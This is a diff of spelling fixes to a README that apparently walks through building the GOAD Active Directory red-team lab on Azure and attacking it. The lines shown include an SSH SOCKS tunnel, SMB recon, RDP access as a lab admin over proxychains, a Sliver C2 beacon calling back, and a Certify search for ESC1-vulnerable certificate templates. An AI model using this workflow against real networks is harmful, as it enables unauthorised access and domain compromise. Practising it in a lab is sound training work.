@@ -7,23 +7,23 @@ First things first we need to setup an account in Azure. This gives us a free ac
 
 You will need to provide a bank card for verification and to charge billing payments to but fear not, we are setting this up for free and the whole lab will be free, for 30 days anyway.
 
-Next we need to upgrade the free account to a pay as you go account. This gives us access to more vCPUs per region and more B Series Burstable Virtual Machine Sizes to build the lab. GOAD requieres we have 12 B Series vCPUS to use which isnt default when setting up an Azure account.
+Next we need to upgrade the free account to a pay as you go account. This gives us access to more vCPUs per region and more B Series Burstable Virtual Machine Sizes to build the lab. GOAD requires we have 12 B Series vCPUS to use which isnt default when setting up an Azure account.
 
 Follow this link - `https://learn.microsoft.com/en-us/azure/cost-management-billing/manage/upgrade-azure-subscription`
 
 ![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/6bcf993f-5143-4c58-aa41-089424e357d7)
 
-This will happen automatically once you have followed the above. Next we need to request extra resources for your Azure Account. When an account is first created, Azure only allows you 10 vCPUs per Region and 10 BSeries vCPUs. I assume this is to prevent fraud or you unknowlingly racking up more charges than you can realistically afford.
+This will happen automatically once you have followed the above. Next we need to request extra resources for your Azure Account. When an account is first created, Azure only allows you 10 vCPUs per Region and 10 BSeries vCPUs. I assume this is to prevent fraud or you unknowingly racking up more charges than you can realistically afford.
 
 Go to your account and search subscriptions.
 
 ![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/0640636d-fe9e-41d2-8a8f-4288007631b5)
 
-Select your subsciption and go to useage and quotas which is under `settings`
+Select your subscription and go to usage and quotas which is under `settings`
 
 ![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/09d7d463-ca1c-43d0-84fe-eaf6cf23046e)
 
-Here you can see the resource quotas you are assigned. Your vCPU per region and B Series will be 10. Mine is now 14 and 12 respectively but you will need to click `New Quata Request in the top left`
+Here you can see the resource quotas you are assigned. Your vCPU per region and B Series will be 10. Mine is now 14 and 12 respectively but you will need to click `New Quota Request in the top left`
 
 ![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/ffe24b86-729e-470a-8ada-104218f70328)
 
@@ -87,7 +87,7 @@ Now go and make a coffee, this will take a while as all the Domain, Users, Group
 
 ## Lets Gooooooooooo
 
-Once that has finished and you havent encountered any errors you will be presented with a IP for the Ubuntu Jump Server and the location of your SSH Private Key for logging in.
+Once that has finished and you have'nt encountered any errors you will be presented with a IP for the Ubuntu Jump Server and the location of your SSH Private Key for logging in.
 
 Mine is at `/GOAD/ad/GOAD/providers/azure/ssh_keys` 
 
@@ -163,7 +163,7 @@ Now lets setup our Dynamic SSH Tunnel. To do this we need a few options
 
 ```bash
 -D 1080 - Tells SSH to setup a dymanic Tunnel, listening on Port 1080
--N      - This states we dont not wantto run a command when the tunnel is established
+-N      - This states we dont not want to run a command when the tunnel is established
 -f      - This forks or backgrounds the tunnel
 -i      - Private key file to use
 ```
@@ -175,7 +175,7 @@ Here is the whole command
 └─$ ssh -D 1080 -N -f -i ubuntu-jumpbox.pem goad@13.80.243.***
 ```
 
-We can check it has worked by runnin `ss -tulpn`
+We can check it has worked by running `ss -tulpn`
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
@@ -212,7 +212,7 @@ and also five hostnames
 
 WINTERFELL, MEEREEN and KINGSLANDING all have SMB Signing Enabled. This points to them possibly being Domain Controllers due to that being the default setting for DCs. The other 2 are potentially workstations/servers.
 
-Lets do some more recon and see if guest access is anabled on any of the shares, unlikley to see this but it does happen.
+Lets do some more recon and see if guest access is enabled on any of the shares, unlikely to see this but it does happen.
 
 ```bash
 ┌──(kali㉿kali)-[~/GOAD]
@@ -290,7 +290,7 @@ RDP         192.168.56.10   3389   KINGSLANDING     [-] sevenkingdoms.local\samw
 ```
 Cool, so we can RDP and samwell.tarly is also a local admin on .22 (Pwn3ed!)
 
-Use xfreerdp ober proxychains and mount a local folder to make transferring files easy.
+Use xfreerdp over proxychains and mount a local folder to make transferring files easy.
 `proxychains xfreerdp  /drive:kali,/home/kali /u:samwell.tarly /v:192.168.56.22`
 
 Enter Y to accept the certificate then enter the password
@@ -336,7 +336,7 @@ We get presented with an RDP Session. Sweet. Lets get a Sliver Beacon and go fro
 ## Sliver
 
 
-Free to use C2 Frameowrk. I quite like it so far.
+Free to use C2 Framework. I quite like it so far.
 
 Head over to our ubuntu jump box.
 
@@ -440,7 +440,7 @@ d-r---       11/25/2023  10:56 AM                Videos
 
 PS C:\Users\samwell.tarly> .\beacon.exe
 ```
-Check back in Sliver and we shpuld have our beacon returned to us
+Check back in Sliver and we should have our beacon returned to us
 
 ```bash
 [*] Beacon 17150820 beacon - 192.168.56.22:52761 (castelblack) - windows/amd64 - Sat, 25 Nov 2023 11:06:49 UTC
@@ -626,7 +626,7 @@ sliver (beacon) > certify find /vulnerable /domain:essos.local
 
 ```
 
-There are a few more vunerable Certificate Templates but for this one we will be focussing on ESC1 - https://posts.specterops.io/certified-pre-owned-d95910965cd2
+There are a few more vulnerable Certificate Templates but for this one we will be focussing on ESC1 - https://posts.specterops.io/certified-pre-owned-d95910965cd2
 
 
 
